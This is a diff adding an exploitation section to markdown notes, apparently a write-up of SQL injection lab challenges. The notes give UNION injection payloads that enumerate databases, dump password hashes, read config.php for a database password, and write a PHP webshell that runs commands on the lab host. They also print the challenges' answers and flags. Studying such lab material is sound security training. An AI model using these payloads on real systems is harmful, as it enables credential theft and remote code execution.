@@ -12,6 +12,10 @@
     2. [Using Comments](#using-comments)
     3. [Union Clause](#union-clause)
     4. [Union Injection](#union-injection)
+3. [Exploitation](#exploitation)
+    1. [Database Enumeration](#database-enumeration)
+    2. [Reading Files](#reading-files)
+    3. [Writing Files](#writing-files)
 
 ## Payloads
 1. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
@@ -144,3 +148,87 @@
     cn' UNION select 1,user(),3,4-- -
     ```
     The answer is `root@localhost`.
+
+## Exploitation
+### Database Enumeration
+#### Challenges
+1. What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?
+
+    We can enumerate what is database availabe in here.
+
+    ```SQL
+    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+    ```
+    ![alt text](<Assets/Database Enumeration - 1.png>)
+
+    It has ilfreight databse like in the challenge. Now we need to enumerate table name.
+
+    ```SQL
+    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
+    ```
+    ![alt text](<Assets/Database Enumeration - 2.png>)
+
+    Now we need to know the column structure in the users table.
+
+    ```SQL
+    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
+    ```
+    ![alt text](<Assets/Database Enumeration - 3.png>)
+
+    It has username and password columns. Now we can try to retrive data from it.
+
+    ```SQL
+    cn' UNION select 1, username, password, 4 from ilfreight.users-- -
+    ```
+    ![alt text](<Assets/Database Enumeration - 4.png>)
+
+    The answer is `9da2c9bcdf39d8610954e0e11ea8f45f`.
+
+### Reading Files
+#### Challenges
+1. We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
+
+    Based on the module, this user has previllege to read and load the file. So now, we need to retive the seacrh.php code.
+    ```SQL
+    cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+    ```
+    ![alt text](<Assets/Reading Files - 1.png>)
+
+    The challenge have given us a hint that the database password is located in the imported/included file. We can see from the image above that `config.php` is imported. So we need to read the `config.php` file
+
+    ```SQL
+    cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+    ```
+    ![alt text](<Assets/Reading Files - 2.png>)
+
+    The answer is `dB_pAssw0rd_iS_flag!`.
+
+### Writing Files
+#### Challenges
+1. Find the flag by using a webshell.
+
+    Based on the module, we have already know that we have previllege to write files. We can check by using this.
+
+    ```SQL
+    cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+    ```
+    ![alt text](<Assets/Writing Files - 1.png>)
+
+    Because secure_file_priv is empty, it means secure_file_priv is disabled. Now we can try to write file. This instance is using .php. So it is likely the output will be stored in `/var/www/html/`. Here the payload we can use to write webshell:
+
+    ```SQL
+    cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+    ```
+    If it doesnt give an error, it is likely success write the file. Now we can try to locate the flag location.
+
+    ```URL
+    http://83.136.255.170:38644/shell.php?0=find%20/%20-name%20flag.txt%202%3E/dev/null
+    ```
+    ![alt text](<Assets/Writing Files - 2.png>)
+
+    Now we can cat the flag by using this:
+
+    ```URL
+    83.136.255.170:38644/shell.php?0=cat%20/var/www/flag.txt 
+    ```
+    The answer is `d2b5b27ae688b6a0f1d21b7d3a0798cd`.
